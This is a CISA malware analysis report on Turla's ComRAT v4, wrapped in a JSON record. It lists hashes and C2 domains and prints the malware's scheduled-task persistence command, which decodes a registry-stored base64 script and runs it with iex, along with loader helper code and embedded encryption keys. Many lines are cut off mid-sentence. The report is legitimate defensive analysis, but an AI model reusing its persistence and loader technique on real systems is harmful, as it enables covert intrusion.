{
    "id": "d31b16bc-8733-4672-bc26-0ea265a0ba65",
    "created_at": "2023-01-12T15:06:22.230622Z",
    "updated_at": "2025-03-27T02:16:20.95331Z",
    "deleted_at": null,
    "sha1_hash": "547b2a4bc45baa6a1f525d03bc9fc35d0043b7dc",
    "title": "2020-10-29 - Malware Analysis Report (AR20-303A)- PowerShell Script- ComRAT",
    "authors": "",
    "file_creation_date": "2022-05-29T01:05:47Z",
    "file_modification_date": "2022-05-29T01:05:47Z",
    "file_size": 593209,
    "plain_text": "# MAR-10310246-2.v1 – PowerShell Script: ComRAT\n\n**us-cert.cisa.gov/ncas/analysis-reports/ar20-303a**\n\n## Notification\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of an\n\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeab\n\n## Summary\n\nDescription\n\nThis Malware Analysis Report (MAR) is the result of analytic efforts between the Cybersecurity and Infrastructure Security Agency (CISA), the Cy\n\nFBI has high-confidence that Russian-sponsored APT actor Turla, which is an espionage group active for at least a decade, is using ComRAT ma\n\nThis report analyzes a PowerShell script that installs a PowerShell script, which will decode and load a 64-bit dynamic-link library (DLL) identified\nto receive commands and exfiltrate data. The ComRAT v4 file contains a Virtual File System (VFS) in File Allocation Table 16 (FAT16) format, whi\n\nUsers or administrators should flag activity associated with the malware and report the activity to the CISA or the FBI Cyber Watch (CyWatch), an\n[For a downloadable copy of IOCs, see: MAR-10310246-2.v1.WHITE.stix.](https://us-cert.cisa.gov/sites/default/files/publications/MAR-10310246-2.v1.WHITE.stix.xml)\n\nSubmitted Files (5)\n\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d (Communication_module_32.dll)\n\n134919151466c9292bdcb7c24c32c841a5183d880072b0ad5e8b3a3a830afef8 (corrected.ps1)\n\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405 (Communication_module_64.dll)\n\n44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316 (ComRATv4.exe)\n\na3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642 (Decode_PowerShell.ps1)\n\nDomains (6)\n\nbranter.tk\n\nbronerg.tk\n\ncrusider.tk\n\nduke6.tk\n\nsanitar.ml\n\nwekanda.tk\n\n## Findings\n\n**134919151466c9292bdcb7c24c32c841a5183d880072b0ad5e8b3a3a830afef8**\n\nTags\n\ndropper\n\nDetails\n\n**Name** corrected.ps1\n\n**Size** 4345430 bytes\n\n**Type** Little-endian UTF-16 Unicode text, with very long lines, with CRLF, LF line terminators\n\n**MD5** 65419948186842f8f3ef07cafb71f59a\n\n**SHA1** 93537b0814177e2101663306aa17332b9303e08a\n\n**SHA256** 134919151466c9292bdcb7c24c32c841a5183d880072b0ad5e8b3a3a830afef8\n\n**SHA512** 83d093c6febacb11fcde57fee98c2385f628e5cd3629bfabd0f9e4d2c5de18c6336b3d3aff8081b06a827e742876d19ae370e81890c247d\n\n**ssdeep** 24576:+vq2EYNg0gX792UHDoSe9Ov2a8p+JnHZUoWYWUpcfm3WuPhu/aqJOFKs4Wuw054o:Drr9q0v4ubJmg4OFuwkOM5NZihxs\n\n**Entropy** 4.004402\n\nAntivirus\n\nNo matches found.\n\n\n-----\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nRelationships\n\n1349191514... Contains a3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642\n\nDescription\n\nThis file is a heavily encoded malicious PowerShell script. It is designed to install a malicious PowerShell script into a registry on the victim system\n\n—Begin Modified Scheduled Task—\nC:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\n—End Modified Scheduled Task—\n\nThe modification of this scheduled task causes the installed malicious PowerShell script to be executed. Displayed below is the original scheduled\n\n—Begin Original Scheduled Task—\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n<RegistrationInfo>\n<Version>1.0</Version>\n<SecurityDescriptor>D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GRGX;;;AU)</SecurityDescriptor>\n<Source>$(@%systemRoot%\\system32\\wsqmcons.exe,-106)</Source>\n<Author>$(@%systemRoot%\\system32\\wsqmcons.exe,-108)</Author>\n<Description>$(@%systemRoot%\\system32\\wsqmcons.exe,-107)</Description>\n<URI>\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator</URI>\n</RegistrationInfo>\n<Principals>\n<Principal id=\"WinSQMAccount\">\n<UserId>S-1-5-18</UserId>\n</Principal>\n</Principals>\n<Settings>\n<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n<StartWhenAvailable>true</StartWhenAvailable>\n<IdleSettings>\n<StopOnIdleEnd>true</StopOnIdleEnd>\n<RestartOnIdle>false</RestartOnIdle>\n</IdleSettings>\n<UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>\n</Settings>\n<Triggers>\n<TimeTrigger>\n<StartBoundary>2004-01-02T00:00:00</StartBoundary>\n<Repetition>\n<Interval>PT6H</Interval>\n</Repetition>\n</TimeTrigger>\n</Triggers>\n<Actions Context=\"WinSQMAccount\">\n<Exec>\n<Command>%SystemRoot%\\System32\\wsqmcons.exe</Command>\n</Exec>\n</Actions>\n</Task>\n—End Original Scheduled Task—\n\nThe scheduled task is then modified by this malicious PowerShell script. Displayed below is the modified scheduled task:\n\n—Begin Modified Scheduled Task—\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n<RegistrationInfo>\n<Source>$(@%systemRoot%\\system32\\wsqmcons.exe,-106)</Source>\n<Author>$(@%systemRoot%\\system32\\wsqmcons.exe,-108)</Author>\n<Version>1.0</Version>\n<Description>$(@%systemRoot%\\system32\\wsqmcons.exe,-107)</Description>\n<URI>\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator</URI>\n<SecurityDescriptor>D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GRGX;;;AU)</SecurityDescriptor>\n</RegistrationInfo>\n<Triggers>\n\n<TimeTrigger>\n\n\n-----\n\np\n<Interval>PT6H</Interval>\n<StopAtDurationEnd>false</StopAtDurationEnd>\n</Repetition>\n<StartBoundary>2004-01-02T00:00:00</StartBoundary>\n<Enabled>true</Enabled>\n</TimeTrigger>\n<LogonTrigger>\n<Enabled>true</Enabled>\n</LogonTrigger>\n</Triggers>\n<Principals>\n<Principal id=\"WinSQMAccount\">\n<RunLevel>LeastPrivilege</RunLevel>\n<UserId>SYSTEM</UserId>\n</Principal>\n</Principals>\n<Settings>\n<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n<AllowHardTerminate>true</AllowHardTerminate>\n<StartWhenAvailable>true</StartWhenAvailable>\n<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n<IdleSettings>\n<StopOnIdleEnd>true</StopOnIdleEnd>\n<RestartOnIdle>false</RestartOnIdle>\n</IdleSettings>\n<AllowStartOnDemand>true</AllowStartOnDemand>\n<Enabled>true</Enabled>\n<Hidden>false</Hidden>\n<RunOnlyIfIdle>false</RunOnlyIfIdle>\n<DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>\n<UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>\n<WakeToRun>false</WakeToRun>\n<ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n<Priority>7</Priority>\n</Settings>\n<Actions Context=\"WinSQMAccount\">\n<Exec>\n<Command>cmd.exe</Command>\n<Arguments>/c \"%SystemRoot%\\System32\\wsqmcons.exe &amp; PowerShell.exe -v 2 \"$GS459ea = 'KVYYOBBA4331110uhyicnoor';\n\n[Text.Encoding]::ASCII.GetString([Convert]::\\\"Fr`omBa`se6`4Str`ing\\\"((gp HKLM:\\SOFTWARE\\Microsoft\\SQMClient\\Windows).WSqmCons))|iex;\n\"\"</Arguments>\n</Exec>\n</Actions>\n</Task>\n—End Modified Scheduled Task—\n\nThe modification of the scheduled task illustrated below indicates the primary purpose of this task modification is to decode and execute a Powe\n\n—Begin Specific Scheduled Task Module—\n<Actions Context=\"WinSQMAccount\">\n<Exec>\n<Command>cmd.exe</Command>\n<Arguments>/c \"%SystemRoot%\\System32\\wsqmcons.exe &amp; PowerShell.exe -v 2 \"$GS459ea = 'KVYYOBBA4331110uhyicnoor';\n\n[Text.Encoding]::ASCII.GetString([Convert]::\\\"Fr`omBa`se6`4Str`ing\\\"((gp HKLM:\\SOFTWARE\\Microsoft\\SQMClient\\Windows).WSqmCons))|iex;\n\"\"</Arguments>\n—End Specific Scheduled Task Module—\n\nThis malicious script installs a PowerShell script (a3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642) into the “Wsqm\n**a3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642**\n\nTags\n\ntrojan\n\nDetails\n\n**Name** Decode_PowerShell.ps1\n\n**Size** 1264496 bytes\n\n**Type** ASCII text, with very long lines, with CRLF, LF line terminators\n\n**MD5** 0fd79f4c60593f6aae69ff22086c3bb0\n\n**SHA1** 07f0692c856703d75a9946a0fbb3c0db03f7ac40\n\n\n-----\n\n**SHA256** a3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642\n\n**SHA512** 28a0ae0a779aa88499f70cf97ef9db9482527017ea76ee2e469e4184684c4d4fb0559e50f1721e7e9d02655bee4cdf7b12c62a3d037ea\n\n**ssdeep** 24576:jarQlVyeHtWdf7PyJjwLKWp57+7fb0TLaB7VrE:jD567vs1tm\n\n**Entropy** 6.091278\n\nAntivirus\n\n**Antiy** GrayWare/PowerShell.Mimikatz.a\n\n**ClamAV** Win.Trojan.PSempireInj-7013548-0\n\n**Microsoft Security Essentials** Trojan:PowerShell/Powersploit.J\n\n**NANOAV** Trojan.Script.ExpKit.eydujq\n\n**Symantec** Hacktool.Mimikatz\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nRelationships\n\na3170c32c0... Contained_Within 134919151466c9292bdcb7c24c32c841a5183d880072b0ad5e8b3a3a830afef8\n\na3170c32c0... Dropped 44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\nDescription\n\nThis heavily encoded PowerShell script is installed by the malicious script “corrected.ps1” (134919151466c9292bdcb7c24c32c841a5183d880072\n\nRemoval of some of the PowerShell obfuscation reveals the functions illustrated below. These functions are used to decompress the embedded D\n\n—Begin PowerShell Helper Functions—\nusing System;\nusing System.IO;\nusing System.IO.Compression;\n\npublic static class CD475bjf{\npublic static void DBQ800fc(Stream input, Stream output){byte[] buffer = new byte[16 * 1024];\nint bytesRead;\nwhile((bytesRead = input.Read(buffer, 0, buffer.Length)) > 0){\noutput.Write(buffer, 0, bytesRead);\n}}}\n\npublic static class MAE38aee{\n\npublic static byte[] JZ653jdh(byte[] arrayToCompress){\nusing (MemoryStream outStream = new MemoryStream()){using (GZipStream tinyStream = new GZipStream(outStream, CompressionMo\nreturn outStream.ToArray();\n}}\n\npublic static byte[] PGN255ij(byte[] arrayToDecompress){\nusing (MemoryStream inStream = new MemoryStream(arrayToDecompress))using (GZipStream bigStream = new GZipStream(inStream, C\nreturn bigStreamOut.ToArray();\n}}}\n\n#decode base64 above\n$decompress = [Convert]::FromBase64String($decompressbase64);\n\n#create another text object for use later\n$NS70gea = New-Object System.Text.ASCIIEncoding;\n\n#convert base64 decoded value to string\n$decompress = $NS70gea.GetString($decompress,0,$decompress.Length);\n—End PowerShell Helper Functions—\n\n\n-----\n\ng p p y p p\nScreenshots\n\n**Figure 1 - Screenshot of the payload embedded within this malicious script.**\n\n**Figure 2 - Screenshot of the function used to load a DLL directly from memory and inject it into a remote process.**\n\n**44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316**\n\nTags\n\ntrojan\n\nDetails\n\n**Name** ComRATv4.exe\n\n**Size** 1827840 bytes\n\n**Type** PE32+ executable (DLL) (GUI) x86-64, for MS Windows\n\n**MD5** faaafa3e115033ba5115ed6a6ba59ba9\n\n**SHA1** ca16a95cd38707bad2dc524bb3086b3c0cb3e372\n\n**SHA256** 44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\n**SHA512** 6f2fe02c1e15be2409f89ff1e6ae3c78f87e242ee448fe5ff6d375a74f10c7c6cc01f3f6d796aa34599a891e03c5d421d10f0c041e5a6dc0e3\n\n**ssdeep** 49152:jTRjrgdOU9p1PZH/JNTFTJT5dwIwzQJH:PRCBNTBwAH\n\n**Entropy** 6.463931\n\n\n-----\n\n**Ahnlab** Trojan/Win64.Turla\n\n**ESET** a variant of Win64/Turla.BX trojan\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nPE Metadata\n\n**Compile Date** 2018-03-06 09:38:38-05:00\n\n**Import Hash** d9d661a606c9d1c23b47672d1067de68\n\nPE Sections\n\n**MD5** **Name** **Raw Size** **Entropy**\n\n11525199e6e248e88e0529cf72a9002d header 1024 2.934959\n\n0f3258519a92690d14406e141dcb285b .text 1027584 6.441800\n\nfa4840dc4653443d4574486df39bc6a3 .rdata 481280 4.896843\n\nca22c78d526550925d7843a24cd1d266 .data 264704 7.368343\n\nf7cc8fa49cfa87a125d8354082e162f3 .pdata 47104 6.030652\n\nef6fdd7440f36ba21373b4585a5c83e4 .rsrc 512 4.724729\n\n4f16258cf938a4bc7fe0ae92121f442d .reloc 5632 5.425381\n\nRelationships\n\n44d6d67b53... Contains 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n44d6d67b53... Contains 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n44d6d67b53... Dropped_By a3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642\n\nDescription\n\nThis application is a 32-bit Windows DLL that has been identified as a module of ComRAT v4. The DLL is loaded into Windows Explorer (Explorer\n\n--Begin files-\"%TEMP%\\iecache.bin\" ==> an AES-256-XTS encrypted VFS FAT16 format, containing the malware configuration and the logs files. (The encryp\n\"%TEMP%\\FSAPIDebugLogFile.txt\n--End files-\nThe malware injects an embedded communication module (00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d or (166\n\nIllustrated below are sample data observed in the decrypted VFS in FAT16 format. Some of these files can be updated in the VFS using backdoor\n\n--Begin sample data in the VFS -\"/etc/pal/\" contains a list of C2 domains: \"bronerg.tk|crusider.tk|duke6.tk\"\n\"/etc/gal.bin\" contains a list of C2 domains: \"sanitar.ml|wekanda.tk|branter.tk\"\n\"/etc/pki/aes_key.pki\" : Contains the Advanced Encryption Standard (AES) encryption keys for the C2 communications:\n\n--Begin AES key-4F8112E9E5AB5391C584D567B58E539F0400094A83EA0C2DDC7FA455FCF447B1\n--End AES key-\n\"/etc/pki/public_cert.pki\" contains the Rivest–Shamir–Adleman (RSA) encryption key used for the C2 communications:\n\n--Begin RSA key-BE51E00093CEB0A5FCAE59EB4EEEB3079D1CB17FC195321587CB513003826917B0BC13EB3B9A4209A4FFAF19C07249D360F447A6FAE\n--End RSA key-\nIt uses the public key cryptography with RSA and AES encrypted email attachments for its Gmail C2 channel.\n\"/etc/mail/subj_dict\" contains the the Subject \"Re: |RE: |FW: |FWD: | Fw: | Fwd:| FYI: |FYIP |NRN: | NT: | N/T | n/t| NB |NM| n/m |N/M: |*n/m*\"\n\n\"/etc/php_storage/GET/DEF/server.txt \" and \"/etc/php_storage/POST/DEF/server.txt\" contains server IP \"172.22.150.125\".\n--End sample data in the VFS -\n\n-----\n\n**Figure 3 - The first bytes of the decrypted VFS in FAT16 format.**\n\n**Figure 4 - The decrypted VFS hierarchy, containing the malware configuration and the logs files.**\n\n**00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d**\n\nTags\n\nbackdoordownloaderloadertrojan\n\nDetails\n\n**Name** Communication_module_32.dll\n\n**Size** 61440 bytes\n\n**Type** PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\n\n**MD5** e509c3a40045d2dab9404240f3f201ed\n\n**SHA1** 86f747cac3b16ed2dab6d9f72a347145ff7a850d\n\n**SHA256** 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n**SHA512** f78827b6fc258f4a63dd17fec2acb7114329a9d7fd426c72838f2e5e5c54c12fce7be7a0eb9c7e7e74b01fe80c42293ef89c3bcbafd230a6\n\n**ssdeep** 1536:zlAjaBOUFoD0C8YQ7aZS7C2kkAxWzg39xa3cdjrH++:zl2uOUG0CBQ7aZS7C3uzg39xEM\n\n**Entropy** 5.338807\n\nAntivirus\n\n**Antiy** Trojan[Backdoor]/Win32.Turla\n\n**Avira** TR/Crypt.XPACK.Gen3\n\n**ESET** a variant of Win32/Turla.EO trojan\n\n**Ikarus** Trojan-Downloader.Win32.Farfli\n\n**NANOAV** Trojan.Win32.Turla.hlrzcr\n\n**Symantec** Heur.AdvML.B\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nPE Metadata\n\n\n-----\n\n**Compile Date** 2018-03-06 09:36:54-05:00\n\n**Import Hash** 87ab41c57e95562a3e81f0609398b278\n\nPE Sections\n\n**MD5** **Name** **Raw Size** **Entropy**\n\nb9bd1636e8c11ff1ab2368771e89cfac header 4096 0.612975\n\n077bf2412ba289da7b6261ffec65988d .text 49152 6.051754\n\n1c95870051ff12b740487ff93d19ef3b .rdata 4096 0.317233\n\nb86e403ac8c58a013fe4cda6b6715804 .reloc 4096 0.019202\n\nRelationships\n\n00352afc7e... Contained_Within 44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\n00352afc7e... Connected_To branter.tk\n\n00352afc7e... Connected_To wekanda.tk\n\n00352afc7e... Connected_To sanitar.ml\n\n00352afc7e... Connected_To duke6.tk\n\n00352afc7e... Connected_To bronerg.tk\n\n00352afc7e... Connected_To crusider.tk\n\nDescription\n\nThis application is a 32-bit Windows DLL that has been identified as the communication module injected into the victim's system default browser b\n\n--Begin list of domains-bronerg.tk\ncrusider.tk\nduke6.tk\nsanitar.ml\nwekanda.tk\nbranter.tk\n--End list of domains-\nDisplayed below is sample request header:\n\n--Begin header-CONNECT bronerg[.]tk:443 HTTP/1.0\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .N\nHost: bronerg.tk:443\nContent-Length: 0\nConnection: Keep-Alive\n--End header-**bronerg.tk**\n\nTags\n\ncommand-and-control\n\nWhois\n\nDomain name:\nBRONERG.TK\n\nOrganisation:\nFreedom Registry, Inc.\n2225 East Bayshore Road #290\nPalo Alto CA 94303\nUnited States\nPhone: +1 650-681-4172\nFax: +1 650-681-4173\n\nDomain Nameservers:\nNS01.FREENOM.COM\nNS02.FREENOM.COM\nNS03.FREENOM.COM\nNS04.FREENOM.COM\nRelationships\n\n\n-----\n\nbronerg.tk Connected_From 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\nbronerg.tk Connected_From 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\nDescription\n\nComRAT v4 C2 domain.\n\n**crusider.tk**\n\nTags\n\ncommand-and-control\n\nPorts\n\n443 TCP\n\nWhois\n\nDomain name:\nCRUSIDER.TK\n\nOrganisation:\nFreedom Registry, Inc.\n2225 East Bayshore Road #290\nPalo Alto CA 94303\nUnited States\nPhone: +1 650-681-4172\nFax: +1 650-681-4173\n\nDomain Nameservers:\nNS01.FREENOM.COM\nNS02.FREENOM.COM\nNS03.FREENOM.COM\nNS04.FREENOM.COM\nRelationships\n\ncrusider.tk Connected_From 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\ncrusider.tk Connected_From 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\nDescription\n\nComRAT v4 C2 domain.\n\n**duke6.tk**\n\nTags\n\ncommand-and-control\n\nWhois\n\nDomain name:\nDUKE6.TK\n\nOrganisation:\nFreedom Registry, Inc.\n2225 East Bayshore Road #290\nPalo Alto CA 94303\nUnited States\nPhone: +1 650-681-4172\nFax: +1 650-681-4173\n\nDomain Nameservers:\nNS01.FREENOM.COM\nNS02.FREENOM.COM\nNS03.FREENOM.COM\nNS04.FREENOM.COM\nRelationships\n\nduke6.tk Connected_From 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\nduke6.tk Connected_From 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\nDescription\n\nComRAT v4 C2 domain.\n\n**sanitar.ml**\n\nTags\n\n\n-----\n\nWhois\n\nDomain name:\nSANITAR.ML\n\nOrganisation:\nFreedom Registry, Inc.\n2225 East Bayshore Road #290\nPalo Alto CA 94303\nUnited States\nPhone: +1 650-681-4172\nFax: +1 650-681-4173\n\nDomain Nameservers:\nNS01.FREENOM.COM\nNS02.FREENOM.COM\nNS03.FREENOM.COM\nNS04.FREENOM.COM\nRelationships\n\nsanitar.ml Connected_From 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\nsanitar.ml Connected_From 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\nDescription\n\nComRAT v4 C2 domain.\n\n**wekanda.tk**\n\nTags\n\ncommand-and-control\n\nWhois\n\nDomain name:\nWEKANDA.TK\n\nOrganisation:\nFreedom Registry, Inc.\n2225 East Bayshore Road #290\nPalo Alto CA 94303\nUnited States\nPhone: +1 650-681-4172\nFax: +1 650-681-4173\n\nDomain Nameservers:\nNS01.FREENOM.COM\nNS02.FREENOM.COM\nNS03.FREENOM.COM\nNS04.FREENOM.COM\nRelationships\n\nwekanda.tk Connected_From 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\nwekanda.tk Connected_From 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\nDescription\n\nComRAT v4 C2 domain.\n\n**branter.tk**\n\nTags\n\ncommand-and-control\n\nPorts\n\n443 TCP\n\nWhois\n\nNo Whois record at the time of analysis.\n\nRelationships\n\nbranter.tk Connected_From 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\nbranter.tk Connected_From 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\n-----\n\nComRAT v4 C2 domain.\n\n**166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405**\n\nTags\n\ntrojan\n\nDetails\n\n**Name** Communication_module_64.dll\n\n**Size** 64000 bytes\n\n**Type** PE32+ executable (DLL) (GUI) x86-64, for MS Windows\n\n**MD5** 54902e33dd6d642bc5530de33b19e43c\n\n**SHA1** a06f0e29fca6eb29bf5334fb3b84a872172b0e28\n\n**SHA256** 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n**SHA512** 28b8f63af33f4aebd2b5b582750036db718f657640aca649d4b2b95188661da3834398a56184ee08f64ddf1d32198e722be46dbfbc78e4\n\n**ssdeep** 1536:p2JmzHKhyOjQuCLA/9zYgJS7aWSXEuT2XWZdjoEGbgqPU6Izj6N1o6OtAEBiUm5+:p2JmcjQuCLA/VYgJS7H21yXQdj5G0qMy\n\n**Entropy** 5.939047\n\nAntivirus\n\n**ESET** a variant of Win64/Turla.CN trojan\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nPE Metadata\n\n**Compile Date** 2018-03-06 09:37:48-05:00\n\n**Import Hash** 87ab41c57e95562a3e81f0609398b278\n\nPE Sections\n\n**MD5** **Name** **Raw Size** **Entropy**\n\n199ab75383a70bd1148671ca1c689d0e header 1024 2.031353\n\n46c52ca20a919c2314e32193eac9ec66 .text 60416 5.990363\n\na97e460909f791b5d0b571099a5b7b56 .rdata 1536 4.519592\n\nc5ba9ad86e832155180da146aef6eabc .pdata 1024 3.061435\n\nRelationships\n\n166b1fb3d3... Contained_Within 44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\n166b1fb3d3... Connected_To bronerg.tk\n\n166b1fb3d3... Connected_To crusider.tk\n\n166b1fb3d3... Connected_To duke6.tk\n\n166b1fb3d3... Connected_To sanitar.ml\n\n166b1fb3d3... Connected_To wekanda.tk\n\n166b1fb3d3... Connected_To branter.tk\n\nDescription\n\nThis application is a 64-bit Windows DLL that has been identified as the communication module injected into the victim's system default browser b\n\n## Relationship Summary\n\n\n-----\n\n1349191514... Contains a3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642\n\na3170c32c0... Contained_Within 134919151466c9292bdcb7c24c32c841a5183d880072b0ad5e8b3a3a830afef8\n\na3170c32c0... Dropped 44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\n44d6d67b53... Contains 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n44d6d67b53... Contains 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n44d6d67b53... Dropped_By a3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642\n\n00352afc7e... Contained_Within 44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\n00352afc7e... Connected_To branter.tk\n\n00352afc7e... Connected_To wekanda.tk\n\n00352afc7e... Connected_To sanitar.ml\n\n00352afc7e... Connected_To duke6.tk\n\n00352afc7e... Connected_To bronerg.tk\n\n00352afc7e... Connected_To crusider.tk\n\nbronerg.tk Connected_From 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\nbronerg.tk Connected_From 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\ncrusider.tk Connected_From 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\ncrusider.tk Connected_From 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\nduke6.tk Connected_From 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\nduke6.tk Connected_From 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\nsanitar.ml Connected_From 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\nsanitar.ml Connected_From 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\nwekanda.tk Connected_From 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\nwekanda.tk Connected_From 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\nbranter.tk Connected_From 00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\nbranter.tk Connected_From 166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n166b1fb3d3... Contained_Within 44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\n166b1fb3d3... Connected_To bronerg.tk\n\n166b1fb3d3... Connected_To crusider.tk\n\n166b1fb3d3... Connected_To duke6.tk\n\n166b1fb3d3... Connected_To sanitar.ml\n\n166b1fb3d3... Connected_To wekanda.tk\n\n166b1fb3d3... Connected_To branter.tk\n\n## Recommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organizatio\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unl\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nS ll ft d l d d f th I t t i t ti\n\n\n-----\n\np pp p ( )\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Specia\n\n## Contact Information\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at t\n\n## Document FAQ\n\n**What is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In most**\n\n**What is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manua**\n\n**Can I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document should**\n\n**Can I submit malware to CISA? Malware samples can be submitted via three methods:**\n\nWeb: [https://malware.us-cert.gov](https://malware.us-cert.gov/)\nE-Mail: 